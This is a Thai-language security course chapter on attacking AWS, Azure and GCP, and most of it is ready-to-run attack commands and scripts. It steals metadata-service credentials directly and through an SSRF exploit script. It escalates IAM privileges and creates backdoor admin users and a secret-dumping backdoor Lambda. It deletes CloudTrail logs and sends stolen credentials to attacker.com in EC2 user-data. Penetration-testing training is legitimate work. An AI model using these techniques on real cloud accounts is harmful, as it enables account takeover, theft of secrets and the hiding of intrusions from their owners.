# Part 59: Cloud Security Advanced (ความปลอดภัย Cloud ขั้นสูง)

## สารบัญ
1. [Cloud Security Architecture](#1-cloud-security-architecture)
2. [AWS Advanced Attacks](#2-aws-advanced-attacks)
3. [Azure Security Testing](#3-azure-security-testing)
4. [GCP Security Testing](#4-gcp-security-testing)
5. [Cloud IAM Privilege Escalation](#5-cloud-iam-privilege-escalation)
6. [Serverless Security](#6-serverless-security)
7. [Cloud Storage Attacks](#7-cloud-storage-attacks)
8. [Cloud Monitoring และ Defense Evasion](#8-cloud-monitoring-และ-defense-evasion)
9. [แบบฝึกหัด Lab](#9-แบบฝึกหัด-lab)

---

## 1. Cloud Security Architecture

### 1.1 Shared Responsibility Model

```
Shared Responsibility Model:

+---------------------------+
| Customer Responsibility  |
| - Data                   |
| - Applications           |
| - Identity/Access        |
| - OS (for IaaS)          |
| - Network config         |
+---------------------------+
| Cloud Provider           |
| - Physical infrastructure|
| - Network fabric         |
| - Hypervisor             |
| - Managed services       |
+---------------------------+

Cloud Attack Surface:
- Exposed S3/Blob/GCS buckets
- Misconfigured IAM policies
- Overprivileged service accounts
- Instance metadata service (IMDS)
- Unencrypted data
- Weak secrets management
- Container/Serverless vulnerabilities
```

### 1.2 Cloud Recon Tools

```bash
# ติดตั้ง tools
pip3 install awscli
pip3 install azure-cli
pip3 install google-cloud-sdk

# Cloud enum tools
pip3 install cloud_enum
pip3 install ScoutSuite
pip3 install Prowler

# ติดตั้ง Pacu (AWS exploit framework)
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# ติดตั้ง cloudmapper
pip3 install cloudmapper

# cloudbrute: หา cloud assets
wget https://github.com/0xsha/CloudBrute/releases/latest/download/cloudbrute_linux_amd64
chmod +x cloudbrute_linux_amd64
./cloudbrute_linux_amd64 -d target.com -k target -t 80 -T 10
```

---

## 2. AWS Advanced Attacks

### 2.1 AWS Recon และ Enumeration

```bash
# ติดตั้ง credentials
cat ~/.aws/credentials
cat ~/.aws/config

# ตรวจสอบ identity
aws sts get-caller-identity
aws iam get-user

# ตรวจสอบ permissions (enumerate what I can do)
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# Enumerate IAM
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local  # customer managed policies
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <version>

# S3
aws s3 ls  # list all buckets
aws s3 ls s3://bucket-name  # list bucket contents
aws s3 sync s3://bucket-name /tmp/exfil/  # download all files

# EC2
aws ec2 describe-instances --region us-east-1
aws ec2 describe-security-groups
aws ec2 describe-vpcs
aws ec2 get-console-output --instance-id i-xxxxx  # read console logs

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>

# SSM Parameter Store (often has secrets)
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# Lambda
aws lambda list-functions
aws lambda get-function --function-name <name>
aws lambda get-function-configuration --function-name <name>
```

### 2.2 IMDS Exploitation

```bash
# Instance Metadata Service (IMDS)
# เข้าถึงได้จากภายใน EC2 instance
IMDS_URL='http://169.254.169.254'

# IMDS v1 (no auth required)
curl $IMDS_URL/latest/meta-data/
curl $IMDS_URL/latest/meta-data/hostname
curl $IMDS_URL/latest/meta-data/iam/info  # IAM role info
curl $IMDS_URL/latest/meta-data/iam/security-credentials/
ROLE_NAME=$(curl -s $IMDS_URL/latest/meta-data/iam/security-credentials/)
curl $IMDS_URL/latest/meta-data/iam/security-credentials/$ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# User data (often has secrets!)
curl $IMDS_URL/latest/user-data

# IMDS v2 (requires token first)
TOKEN=$(curl -X PUT $IMDS_URL/latest/api/token \
    -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" $IMDS_URL/latest/meta-data/

# SSRF -> IMDS attack
curl 'https://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# ใช้ stolen credentials
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=
aws sts get-caller-identity
```

### 2.3 AWS Privilege Escalation

```bash
# iam:CreatePolicyVersion -> replace existing policy
aws iam create-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT:policy/MyPolicy \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
    }' \
    --set-as-default

# iam:CreateLoginProfile -> create console password for user without one
aws iam create-login-profile \
    --user-name admin_user \
    --password 'H@ck3d!Pass'

# iam:PassRole + ec2:RunInstances -> run instance with privileged role
aws ec2 run-instances \
    --image-id ami-xxxxx \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminRole \
    --user-data 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds && curl http://attacker.com/$(base64 /tmp/creds)'

# iam:PassRole + lambda:CreateFunction -> execute code with lambda role
aws lambda create-function \
    --function-name evil_function \
    --runtime python3.9 \
    --handler lambda_function.lambda_handler \
    --role arn:aws:iam::ACCOUNT:role/AdminRole \
    --zip-file fileb://evil_lambda.zip

aws lambda invoke \
    --function-name evil_function \
    --payload '{}' \
    output.txt

# sts:AssumeRole -> assume privileged role
aws sts assume-role \
    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/AdminRole \
    --role-session-name attacker
```

### 2.4 AWS CloudTrail Bypass และ Evasion

```bash
# ตรวจสอบว่า CloudTrail เปิดอยู่
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail-name>

# ไม่ log บาง APIs (data events ต้องเปิดแยกต่างหาก)
# S3 object-level: PutObject, GetObject, DeleteObject
# Lambda: Invoke

# ใช้ Pacu เพื่อ bypass
# Pacu modules:
# aws__enum_account
# iam__enum_users_roles_policies_groups
# s3__bucket_finder
# iam__privesc_scan

# Log ที่มัก bypass
# 1. ใช้ regions ที่ไม่ได้ log
# 2. ใช้ CloudShell (ไม่ถูก log เหมือน API)
# 3. ใช้ lightweight operations ที่ไม่ log ง่าย

# ลบ log (ต้องการสิทธิ์)
aws cloudtrail delete-trail --name <trail-name>  # delete trail
aws cloudtrail stop-logging --name <trail-name>  # stop logging
```

---

## 3. Azure Security Testing

### 3.1 Azure Enumeration

```bash
# Login
az login
az login --use-device-code  # สำหรับ no browser

# ตรวจสอบ identity
az account show
az account list

# Resource enumeration
az resource list
az vm list -o table
az webapp list -o table
az keyvault list
az storage account list

# ดู permissions
az role assignment list --all
az role definition list --name Contributor

# Key Vault
az keyvault list
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# Service Principals
az ad sp list --all
az ad app list --all

# Users
az ad user list
az ad group list
az ad group member list --group "Global Administrators"

# Azure AD
az ad user show --id user@domain.com
az ad signed-in-user show
```

### 3.2 Azure IMDS และ Managed Identity

```bash
# Azure IMDS
curl -H 'Metadata: true' \
    'http://169.254.169.254/metadata/instance?api-version=2021-01-01'

# ดู Managed Identity token
curl -H 'Metadata: true' \
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

# ใช้ token
TOKEN=$(curl -s -H 'Metadata: true' \
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])')

curl -H "Authorization: Bearer $TOKEN" \
    'https://management.azure.com/subscriptions?api-version=2020-01-01'

# Storage token
TOKEN=$(curl -s -H 'Metadata: true' \
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])')

curl -H "Authorization: Bearer $TOKEN" \
    -H 'x-ms-version: 2019-12-12' \
    'https://storageaccount.blob.core.windows.net/?comp=list'
```

### 3.3 Azure Privilege Escalation

```bash
# หา subscription หรือ resource groups ที่สามารถ assign roles
az role assignment list --all --assignee $(az account show --query 'user.name' -o tsv)

# Owner role -> สร้าง backdoor user
az ad user create \
    --display-name backdoor \
    --user-principal-name backdoor@tenant.onmicrosoft.com \
    --password 'Backdoor@123'

# เพิ่ม role assignment
az role assignment create \
    --role Owner \
    --assignee backdoor@tenant.onmicrosoft.com \
    --scope /subscriptions/<sub_id>

# สร้าง service principal (backdoor)
az ad sp create-for-rbac \
    --name evil-sp \
    --role Owner \
    --scopes /subscriptions/<sub_id>

# Azure AD Admin Abuse
# Global Admin -> Reset passwords, access all resources
az ad user update --id victim@domain.com --password 'NewP@ss'

# Abuse automation accounts
az automation account list
az automation runbook list --automation-account-name <acc> --resource-group <rg>
az automation runbook show --name <runbook> --automation-account-name <acc> --resource-group <rg>
```

---

## 4. GCP Security Testing

### 4.1 GCP Enumeration

```bash
# Login
gcloud auth login
gcloud config set project PROJECT_ID

# ตรวจสอบ identity
gcloud config list
gcloud auth list

# Projects
gcloud projects list

# IAM
gcloud iam roles list
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Compute
gcloud compute instances list
gcloud compute firewall-rules list
gcloud compute networks list

# Storage
gsutil ls  # list all buckets
gsutil ls gs://bucket-name  # list bucket
gsutil cat gs://bucket-name/file  # read file

# Kubernetes Engine
gcloud container clusters list
gcloud container clusters get-credentials CLUSTER_NAME

# Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# SQL
gcloud sql instances list

# Service account keys
gcloud iam service-accounts keys list \
    --iam-account SA@PROJECT.iam.gserviceaccount.com
```

### 4.2 GCP IMDS และ Metadata Server

```bash
# GCP IMDS
METADATA='http://metadata.google.internal/computeMetadata/v1'

curl -H 'Metadata-Flavor: Google' $METADATA/
curl -H 'Metadata-Flavor: Google' $METADATA/project/project-id
curl -H 'Metadata-Flavor: Google' $METADATA/instance/service-accounts/
curl -H 'Metadata-Flavor: Google' $METADATA/instance/service-accounts/default/token
curl -H 'Metadata-Flavor: Google' $METADATA/instance/service-accounts/default/scopes

# ดู SSH keys
curl -H 'Metadata-Flavor: Google' $METADATA/project/attributes/ssh-keys
curl -H 'Metadata-Flavor: Google' $METADATA/instance/attributes/ssh-keys

# Startup scripts (often has secrets)
curl -H 'Metadata-Flavor: Google' $METADATA/instance/attributes/startup-script

# สร้าง token
ACCESS_TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
    $METADATA/instance/service-accounts/default/token \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])')

# ใช้ token
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    'https://www.googleapis.com/oauth2/v1/tokeninfo'

curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    'https://storage.googleapis.com/storage/v1/b/'
```

---

## 5. Cloud IAM Privilege Escalation

### 5.1 AWS IAM Escalation Techniques

```python
#!/usr/bin/env python3
# aws_privesc_scanner.py
import boto3, json

"""
Privilege Escalation Techniques:
1. iam:CreatePolicyVersion - replace policy with Admin
2. iam:SetDefaultPolicyVersion - switch to old version with more perms
3. iam:AttachUserPolicy - attach admin policy
4. iam:AttachGroupPolicy - attach admin policy to group
5. iam:AttachRolePolicy - attach admin policy to role  
6. iam:PutUserPolicy - put inline admin policy
7. iam:PutGroupPolicy - put inline admin policy to group
8. iam:PutRolePolicy - put inline admin policy to role
9. iam:AddUserToGroup - add to admin group
10. iam:UpdateAssumeRolePolicy - update trust policy
11. iam:CreateLoginProfile - create console password
12. iam:UpdateLoginProfile - update someone's password
13. sts:AssumeRole - assume privileged role
14. iam:PassRole + ec2:RunInstances - run privileged instance
15. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
16. codestar:CreateProject - create project with custom IAM
17. iam:CreateAccessKey - create access key for admin user
"""

class AWSPrivEscScanner:
    def __init__(self):
        self.iam = boto3.client('iam')
        self.sts = boto3.client('sts')
        self.findings = []
    
    def check_user_permissions(self):
        identity = self.sts.get_caller_identity()
        username = identity['Arn'].split('/')[-1]
        
        # Get all user policies
        permissions = set()
        
        # Inline policies
        try:
            user_policies = self.iam.list_user_policies(UserName=username)
            for policy_name in user_policies['PolicyNames']:
                policy = self.iam.get_user_policy(UserName=username, PolicyName=policy_name)
                self._extract_permissions(policy['PolicyDocument'], permissions)
        except:
            pass
        
        # Attached policies
        try:
            attached = self.iam.list_attached_user_policies(UserName=username)
            for policy in attached['AttachedPolicies']:
                version = self.iam.get_policy(PolicyArn=policy['PolicyArn'])['Policy']['DefaultVersionId']
                doc = self.iam.get_policy_version(PolicyArn=policy['PolicyArn'], VersionId=version)['PolicyVersion']['Document']
                self._extract_permissions(doc, permissions)
        except:
            pass
        
        # Check for privesc
        privesc_perms = [
            'iam:CreatePolicyVersion',
            'iam:AttachUserPolicy',
            'iam:PutUserPolicy',
            'iam:AddUserToGroup',
            'iam:CreateLoginProfile',
            'iam:CreateAccessKey',
        ]
        
        for perm in privesc_perms:
            if perm in permissions or 'iam:*' in permissions or '*' in permissions:
                self.findings.append(f'PRIVESC: Has {perm}')
        
        return permissions
    
    def _extract_permissions(self, doc, permissions):
        if isinstance(doc, str):
            doc = json.loads(doc)
        
        for stmt in doc.get('Statement', []):
            if stmt.get('Effect') == 'Allow':
                actions = stmt.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                permissions.update(actions)
    
    def enumerate_roles(self):
        """Find roles we can assume"""
        identity = self.sts.get_caller_identity()
        current_arn = identity['Arn']
        
        try:
            roles = self.iam.list_roles()['Roles']
            for role in roles:
                trust_policy = role['AssumeRolePolicyDocument']
                # Check if we can assume this role
                # (simplified check)
                role_policy_str = json.dumps(trust_policy)
                if current_arn in role_policy_str or '*' in role_policy_str:
                    print(f'[+] Can assume role: {role["RoleName"]}')
        except:
            pass

# Run
scanner = AWSPrivEscScanner()
perms = scanner.check_user_permissions()
print(f'[*] Permissions found: {len(perms)}')
for f in scanner.findings:
    print(f'  {f}')
```

### 5.2 Cloud Privilege Escalation via SSRF

```python
#!/usr/bin/env python3
# cloud_ssrf_exploit.py
import requests

# SSRF -> IMDS -> Steal credentials

def exploit_aws_ssrf(vulnerable_url):
    """Exploit SSRF to access AWS IMDS"""
    
    # Step 1: Get IAM role name
    role_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    r = requests.get(vulnerable_url, params={'url': role_url})
    
    if r.status_code == 200:
        role_name = r.text.strip()
        print(f'[+] IAM Role: {role_name}')
        
        # Step 2: Get credentials
        creds_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
        r = requests.get(vulnerable_url, params={'url': creds_url})
        
        if r.status_code == 200:
            import json
            creds = json.loads(r.text)
            print(f'[+] AWS Access Key: {creds["AccessKeyId"]}')
            print(f'[+] AWS Secret Key: {creds["SecretAccessKey"]}')
            print(f'[+] AWS Session Token: {creds["Token"][:50]}...')
            return creds
    
    return None

def exploit_gcp_ssrf(vulnerable_url):
    """Exploit SSRF to access GCP metadata"""
    
    # GCP requires Metadata-Flavor: Google header
    # Need to pass it somehow
    metadata_url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
    
    # Try with header injection (if possible)
    r = requests.get(vulnerable_url, 
                    params={'url': metadata_url},
                    headers={'Metadata-Flavor': 'Google'})
    
    if r.status_code == 200:
        import json
        token = json.loads(r.text)
        print(f'[+] GCP Access Token: {token["access_token"][:50]}...')
        return token
    
    return None

# Test
vulnerable_endpoint = 'https://target.com/fetch?url='
exploit_aws_ssrf(vulnerable_endpoint)
exploit_gcp_ssrf(vulnerable_endpoint)
```

---

## 6. Serverless Security

### 6.1 Lambda Security Testing

```python
#!/usr/bin/env python3
# lambda_security_test.py
import boto3, json, base64

lambda_client = boto3.client('lambda')

def enumerate_lambdas():
    """List all Lambda functions"""
    functions = lambda_client.list_functions()['Functions']
    
    for func in functions:
        name = func['FunctionName']
        role = func['Role']
        env_vars = func.get('Environment', {}).get('Variables', {})
        
        print(f'\n=== {name} ===')
        print(f'  Role: {role}')
        
        # Check for sensitive env vars
        sensitive = ['password', 'secret', 'key', 'token', 'api', 'credential']
        for key, value in env_vars.items():
            if any(s in key.lower() for s in sensitive):
                print(f'  [!] SENSITIVE: {key}={value}')
        
        # Get function code URL
        try:
            url_response = lambda_client.get_function(FunctionName=name)
            code_url = url_response['Code']['Location']
            print(f'  Code URL: {code_url[:80]}...')
        except:
            pass

def test_lambda_injection(function_name, payload):
    """Test Lambda for injection vulnerabilities"""
    try:
        response = lambda_client.invoke(
            FunctionName=function_name,
            InvocationType='RequestResponse',
            Payload=json.dumps(payload).encode()
        )
        
        result = json.loads(response['Payload'].read())
        print(f'Response: {result}')
        return result
    except Exception as e:
        print(f'Error: {e}')

# Command injection via event data
injection_payloads = [
    {'command': 'id; cat /etc/passwd'},
    {'input': '$(id)'},
    {'query': "'; SELECT * FROM users; --"},
    {'template': '{{7*7}}'},
]

for payload in injection_payloads:
    print(f'Testing: {payload}')
    test_lambda_injection('target-function', payload)
```

### 6.2 Lambda Privilege Escalation

```bash
# ผ่าน Lambda เพื่อ escalate

# สร้าง backdoor Lambda
cat > backdoor.py << 'EOF'
import boto3, json, os

def lambda_handler(event, context):
    iam = boto3.client('iam')
    sts = boto3.client('sts')
    
    # ดู identity
    identity = sts.get_caller_identity()
    
    # Dump all secrets
    ssm = boto3.client('ssm')
    secrets = ssm.get_parameters_by_path(
        Path='/', Recursive=True, WithDecryption=True
    )
    
    # สร้าง admin user
    try:
        iam.create_user(UserName='backdoor_admin')
        iam.attach_user_policy(
            UserName='backdoor_admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        key = iam.create_access_key(UserName='backdoor_admin')
        
        return {
            'AccessKeyId': key['AccessKey']['AccessKeyId'],
            'SecretAccessKey': key['AccessKey']['SecretAccessKey'],
            'Identity': identity['Arn'],
            'Secrets': [{'Name': p['Name'], 'Value': p['Value']}
                       for p in secrets.get('Parameters', [])]
        }
    except Exception as e:
        return {'error': str(e), 'identity': identity['Arn']}
EOF

zip backdoor.zip backdoor.py

# Deploy โดยใช้ role ที่มีสิทธิ์
aws lambda create-function \
    --function-name backdoor \
    --runtime python3.9 \
    --handler backdoor.lambda_handler \
    --role arn:aws:iam::ACCOUNT:role/AdminRole \
    --zip-file fileb://backdoor.zip

# Invoke
aws lambda invoke \
    --function-name backdoor \
    --payload '{}' \
    output.json

cat output.json | python3 -m json.tool
```

---

## 7. Cloud Storage Attacks

### 7.1 S3 Bucket Attacks

```bash
# หา S3 buckets
# Tools: cloud_enum, bucket_finder, S3Scanner

# cloud_enum
cloud_enum -k company_name -l logfile.txt

# s3scanner
pip3 install s3scanner
s3scanner scan --buckets-file targets.txt

# ตรวจสอประเภทการเข้าถึง
aws s3 ls s3://target-bucket --no-sign-request  # public bucket
aws s3 ls s3://target-bucket                     # with credentials

# ดาวน์โหลดทั้งหมด
aws s3 sync s3://target-bucket /tmp/exfil/ --no-sign-request

# หาไฟล์ที่น่าสนใจ
aws s3 ls s3://target-bucket --recursive | grep -E '.env|secret|config|credential|backup'

# ตรวจสอบ bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Upload file (ถ้ามีสิทธิ์)
aws s3 cp malware.html s3://target-bucket/malware.html
# ถ้า bucket host static website -> XSS!
```

### 7.2 Azure Blob Storage Attacks

```bash
# หา Azure Storage Accounts
dnsdumpster, shodan, censys
# Format: storageaccount.blob.core.windows.net
# storageaccount.file.core.windows.net

# ตรวจสอบ public access
curl -s 'https://storageaccount.blob.core.windows.net/?comp=list' | xmllint --format -
curl -s 'https://storageaccount.blob.core.windows.net/container?restype=container&comp=list'

# SAS Token abuse
# SAS tokens can be found in URLs, config files
SAS_URL='https://storageaccount.blob.core.windows.net/container/file?sv=2021-06-08&ss=b&srt=sco&sp=rwdlacu&se=...&st=...&spr=https&sig=...'
wget "$SAS_URL" -O downloaded_file

# ตรวจสอบ SAS มี permission อะไรบ้าง
curl -X GET "${SAS_URL}&comp=list&restype=container"
```

---

## 8. Cloud Monitoring และ Defense Evasion

### 8.1 AWS Monitoring

```bash
# AWS Security Services:
# - CloudTrail: API activity logging
# - GuardDuty: Threat detection
# - Security Hub: Security findings
# - Config: Resource configuration
# - Macie: Data classification

# ตรวจสอบว่า enabled
aws cloudtrail describe-trails
aws guardduty list-detectors
aws securityhub describe-hub
aws config describe-configuration-recorders

# Guardrails ใน Pacu
python3 pacu.py
Pacu> set_keys
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run detection__disruption  # test detection
Pacu> run cloudwatch__download_logs  # download logs
```

### 8.2 ScoutSuite Security Audit

```bash
# ScoutSuite: multi-cloud security audit
pip3 install scoutsuite

# AWS
scout aws --no-browser
scout aws -p profile_name --no-browser

# Azure
scout azure --tenant <tenant_id> --no-browser

# GCP
scout gcp -u user@domain.com --no-browser

# เปิด report
ls scout-report/
# เปิด scoutsuite-results/scoutsuite_results.js ใน browser
```

### 8.3 Prowler Security Assessment

```bash
# Prowler: AWS security best practices
pip3 install prowler

# Scan
prowler aws
prowler aws --checks cloudtrail_multi_region_enabled s3_bucket_public_access_block_enabled

# สร้าง report
prowler aws --output-formats html json csv

# สำหรับ Azure
prowler azure --subscription-id <sub_id>

# Specific checks
prowler aws --checks iam_no_root_access_key
prowler aws --compliance cis_2.0_aws
```

---

## 9. แบบฝึกหัด Lab

### Lab 1: AWS IAM Privilege Escalation

```bash
# Setup: flaws.cloud หรือ LocalStack
docker run --rm -it -p 4566:4566 localstack/localstack

# Create user สำหรับ Lab
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:4566

# สร้าง limited user
aws iam create-user --user-name limited_user
aws iam create-access-key --user-name limited_user
aws iam create-policy \
    --policy-name LimitedPolicy \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {"Effect": "Allow",
             "Action": ["iam:CreatePolicyVersion"],
             "Resource": "*"}
        ]
    }'
aws iam attach-user-policy \
    --user-name limited_user \
    --policy-arn arn:aws:iam::000000000000:policy/LimitedPolicy

# เปลี่ยนไปใช้ limited_user
# Exploit: สร้าง policy version ใหม่ ที่เป็น Admin
aws iam create-policy-version \
    --policy-arn arn:aws:iam::000000000000:policy/LimitedPolicy \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
    }' \
    --set-as-default

# ตรวจสอบ
aws iam list-users  # ตอนนี้มีสิทธิ์ Admin
```

### Lab 2: S3 Bucket Misconfiguration

```bash
# สร้าง public bucket
aws s3api create-bucket \
    --bucket vulnerable-bucket-test \
    --region us-east-1

# ลบ ACL protection (public)
aws s3api delete-public-access-block \
    --bucket vulnerable-bucket-test

aws s3api put-bucket-acl \
    --bucket vulnerable-bucket-test \
    --acl public-read

# Upload secret file
echo "API_KEY=super_secret_key_123" > secrets.env
aws s3 cp secrets.env s3://vulnerable-bucket-test/

# Attack: access without credentials
aws s3 ls s3://vulnerable-bucket-test --no-sign-request
aws s3 cp s3://vulnerable-bucket-test/secrets.env /tmp/ --no-sign-request
```

### สรุป Cloud Security

| สิ่งที่ตรวจสอบ | เครื่องมือ |
|------------|----------|
| AWS Security | ScoutSuite, Prowler, Pacu |
| Azure Security | ScoutSuite, AzureHound |
| GCP Security | ScoutSuite, GCPBucketBrute |
| S3 Buckets | s3scanner, cloud_enum |
| IAM Analysis | PMapper, cloudmapper |
| IMDS Testing | curl, Burp SSRF |
| Container/K8s | kube-bench, kube-hunter |

---

← [Part 58: AD Advanced](Part-58-AD-Advanced.md) | [Part 60: Physical Security](Part-60-Physical-Security.md) →
